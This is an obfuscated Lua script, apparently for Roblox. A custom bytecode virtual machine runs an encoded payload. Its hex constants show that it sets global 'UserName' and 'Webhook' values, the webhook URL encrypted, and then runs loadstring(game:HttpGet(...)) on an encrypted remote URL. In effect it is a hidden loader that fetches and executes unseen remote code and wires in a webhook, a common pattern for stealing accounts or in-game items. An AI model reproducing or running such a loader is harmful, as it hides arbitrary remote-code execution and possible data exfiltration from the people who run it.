local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 81) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 28) then
					if (Enum <= 13) then
						if (Enum <= 6) then
							if (Enum <= 2) then
								if (Enum <= 0) then
									local A = Inst[2];
									local B = Stk[Inst[3]];
									Stk[A + 1] = B;
									Stk[A] = B[Inst[4]];
								elseif (Enum == 1) then
									local A = Inst[2];
									do
										return Unpack(Stk, A, Top);
									end
								else
									Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
								end
							elseif (Enum <= 4) then
								if (Enum == 3) then
									Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
								else
									local A = Inst[2];
									local Results, Limit = _R(Stk[A](Stk[A + 1]));
									Top = (Limit + A) - 1;
									local Edx = 0;
									for Idx = A, Top do
										Edx = Edx + 1;
										Stk[Idx] = Results[Edx];
									end
								end
							elseif (Enum == 5) then
								Stk[Inst[2]][Stk[Inst[3]]] = Inst[4];
							else
								Stk[Inst[2]] = Stk[Inst[3]];
							end
						elseif (Enum <= 9) then
							if (Enum <= 7) then
								local A = Inst[2];
								do
									return Stk[A](Unpack(Stk, A + 1, Inst[3]));
								end
							elseif (Enum == 8) then
								Stk[Inst[2]] = Env[Inst[3]];
							else
								local A = Inst[2];
								Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							end
						elseif (Enum <= 11) then
							if (Enum == 10) then
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Stk[A + 1]));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							elseif not Stk[Inst[2]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum == 12) then
							local A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
						else
							Stk[Inst[2]] = {};
						end
					elseif (Enum <= 20) then
						if (Enum <= 16) then
							if (Enum <= 14) then
								Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
							elseif (Enum == 15) then
								local A = Inst[2];
								local B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
							else
								local A = Inst[2];
								Stk[A](Unpack(Stk, A + 1, Top));
							end
						elseif (Enum <= 18) then
							if (Enum == 17) then
								local A = Inst[2];
								local Index = Stk[A];
								local Step = Stk[A + 2];
								if (Step > 0) then
									if (Index > Stk[A + 1]) then
										VIP = Inst[3];
									else
										Stk[A + 3] = Index;
									end
								elseif (Index < Stk[A + 1]) then
									VIP = Inst[3];
								else
									Stk[A + 3] = Index;
								end
							else
								Stk[Inst[2]] = Env[Inst[3]];
							end
						elseif (Enum == 19) then
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						else
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						end
					elseif (Enum <= 24) then
						if (Enum <= 22) then
							if (Enum > 21) then
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Top)));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							else
								Stk[Inst[2]] = Inst[3] + Stk[Inst[4]];
							end
						elseif (Enum > 23) then
							local NewProto = Proto[Inst[3]];
							local NewUvals;
							local Indexes = {};
							NewUvals = Setmetatable({}, {__index=function(_, Key)
								local Val = Indexes[Key];
								return Val[1][Val[2]];
							end,__newindex=function(_, Key, Value)
								local Val = Indexes[Key];
								Val[1][Val[2]] = Value;
							end});
							for Idx = 1, Inst[4] do
								VIP = VIP + 1;
								local Mvm = Instr[VIP];
								if (Mvm[1] == 35) then
									Indexes[Idx - 1] = {Stk,Mvm[3]};
								else
									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
								end
								Lupvals[#Lupvals + 1] = Indexes;
							end
							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
						else
							Stk[Inst[2]] = Inst[3] + Stk[Inst[4]];
						end
					elseif (Enum <= 26) then
						if (Enum == 25) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						else
							local A = Inst[2];
							local Step = Stk[A + 2];
							local Index = Stk[A] + Step;
							Stk[A] = Index;
							if (Step > 0) then
								if (Index <= Stk[A + 1]) then
									VIP = Inst[3];
									Stk[A + 3] = Index;
								end
							elseif (Index >= Stk[A + 1]) then
								VIP = Inst[3];
								Stk[A + 3] = Index;
							end
						end
					elseif (Enum == 27) then
						VIP = Inst[3];
					else
						local A = Inst[2];
						local Step = Stk[A + 2];
						local Index = Stk[A] + Step;
						Stk[A] = Index;
						if (Step > 0) then
							if (Index <= Stk[A + 1]) then
								VIP = Inst[3];
								Stk[A + 3] = Index;
							end
						elseif (Index >= Stk[A + 1]) then
							VIP = Inst[3];
							Stk[A + 3] = Index;
						end
					end
				elseif (Enum <= 42) then
					if (Enum <= 35) then
						if (Enum <= 31) then
							if (Enum <= 29) then
								local A = Inst[2];
								do
									return Stk[A](Unpack(Stk, A + 1, Inst[3]));
								end
							elseif (Enum == 30) then
								local A = Inst[2];
								do
									return Unpack(Stk, A, Top);
								end
							else
								Stk[Inst[2]] = #Stk[Inst[3]];
							end
						elseif (Enum <= 33) then
							if (Enum == 32) then
								Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
							else
								Stk[Inst[2]] = Inst[3];
							end
						elseif (Enum > 34) then
							Stk[Inst[2]] = Stk[Inst[3]];
						else
							Stk[Inst[2]] = Upvalues[Inst[3]];
						end
					elseif (Enum <= 38) then
						if (Enum <= 36) then
							Stk[Inst[2]]();
						elseif (Enum == 37) then
							local NewProto = Proto[Inst[3]];
							local NewUvals;
							local Indexes = {};
							NewUvals = Setmetatable({}, {__index=function(_, Key)
								local Val = Indexes[Key];
								return Val[1][Val[2]];
							end,__newindex=function(_, Key, Value)
								local Val = Indexes[Key];
								Val[1][Val[2]] = Value;
							end});
							for Idx = 1, Inst[4] do
								VIP = VIP + 1;
								local Mvm = Instr[VIP];
								if (Mvm[1] == 35) then
									Indexes[Idx - 1] = {Stk,Mvm[3]};
								else
									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
								end
								Lupvals[#Lupvals + 1] = Indexes;
							end
							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
						else
							Stk[Inst[2]]();
						end
					elseif (Enum <= 40) then
						if (Enum > 39) then
							Stk[Inst[2]] = Inst[3];
						else
							do
								return;
							end
						end
					elseif (Enum > 41) then
						local A = Inst[2];
						local Index = Stk[A];
						local Step = Stk[A + 2];
						if (Step > 0) then
							if (Index > Stk[A + 1]) then
								VIP = Inst[3];
							else
								Stk[A + 3] = Index;
							end
						elseif (Index < Stk[A + 1]) then
							VIP = Inst[3];
						else
							Stk[A + 3] = Index;
						end
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 49) then
					if (Enum <= 45) then
						if (Enum <= 43) then
							local A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
						elseif (Enum == 44) then
							if not Stk[Inst[2]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						else
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						end
					elseif (Enum <= 47) then
						if (Enum == 46) then
							local A = Inst[2];
							Stk[A](Unpack(Stk, A + 1, Top));
						else
							Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
						end
					elseif (Enum == 48) then
						local A = Inst[2];
						Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
					else
						Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
					end
				elseif (Enum <= 53) then
					if (Enum <= 51) then
						if (Enum > 50) then
							Env[Inst[3]] = Stk[Inst[2]];
						else
							Stk[Inst[2]] = {};
						end
					elseif (Enum == 52) then
						Stk[Inst[2]] = Upvalues[Inst[3]];
					else
						do
							return;
						end
					end
				elseif (Enum <= 55) then
					if (Enum == 54) then
						Stk[Inst[2]][Stk[Inst[3]]] = Inst[4];
					else
						Stk[Inst[2]] = #Stk[Inst[3]];
					end
				elseif (Enum == 56) then
					Env[Inst[3]] = Stk[Inst[2]];
				else
					local A = Inst[2];
					local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Top)));
					Top = (Limit + A) - 1;
					local Edx = 0;
					for Idx = A, Top do
						Edx = Edx + 1;
						Stk[Idx] = Results[Edx];
					end
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!183Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E7365727403083Q00557365724E616D6503013Q003103093Q00557365724E616D653203073Q00576562682Q6F6B03793Q00D9D7CF35F5E18851D5CAC826E9A9C350D2CCD66AE7ABCE512QC6D92DE9B4CC0D9E928870BEE9954A83918270BEE2934B8493837DA9ABC80CE6ECF90FDC81FD1CDBD6D527DCEFC947D5CDDF2CEEB0D20CE8ECFD00CE9AC834E6C1CF3FE5B3DF1FC8E4DE7CE284DE3DC7C1F600F096C64ECBC9FD37D6ABE539EE03083Q007EB1A3BB4586DBA703023Q005F47030A3Q0010CE38CCEC37E32BC8F903053Q009C43AD4AA5030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403723Q003CA35D06AF7C097BA54801F2214F20BF5C14A9354326B44618A8234820F94A19B1697535BB4C05B1274865E70626B9320B07BE4403B027523BA5044FE56B0926B24F05F32E4335B35A59B1274F3AF85913A863146484401BA92A4720B85B53EE761F6DF21B46B8334738BF4619B768522CA303073Q002654D72976DC4600303Q0012083Q00013Q0020135Q0002001208000100013Q002013000100010003001208000200013Q002013000200020004001208000300053Q00062C0003000A000100010004293Q000A0001001208000300063Q002013000400030007001208000500083Q002013000500050009001208000600083Q00201300060006000A00062500073Q000100062Q00233Q00064Q00238Q00233Q00044Q00233Q00014Q00233Q00024Q00233Q00053Q0012210008000C3Q0012380008000B3Q0012210008000C3Q0012380008000D4Q0006000800073Q0012210009000F3Q001221000A00104Q00090008000A00020012380008000E3Q001208000800114Q0006000900073Q001221000A00123Q001221000B00134Q00090009000B000200203600080009000C001208000800143Q001208000900153Q00200F0009000900162Q0006000B00073Q001221000C00173Q001221000D00184Q0019000B000D4Q001600096Q003000083Q00022Q00240008000100012Q00273Q00013Q00013Q00023Q00026Q00F03F026Q00704002264Q003200025Q001221000300014Q001F00045Q001221000500013Q0004110003002100012Q002200076Q0006000800024Q0022000900014Q0022000A00024Q0022000B00034Q0022000C00044Q0006000D6Q0006000E00063Q00202F000F000600012Q0019000C000F4Q0030000B3Q00022Q0022000C00034Q0022000D00044Q0006000E00014Q001F000F00014Q0003000F0006000F001015000F0001000F2Q001F001000014Q000300100006001000101500100001001000202F0010001000012Q0019000D00104Q0016000C6Q0030000A3Q000200200E000A000A00022Q00040009000A4Q002E00073Q000100041A0003000500012Q0022000300054Q0006000400024Q001D000300044Q001E00036Q00273Q00017Q00", GetFEnv(), ...);
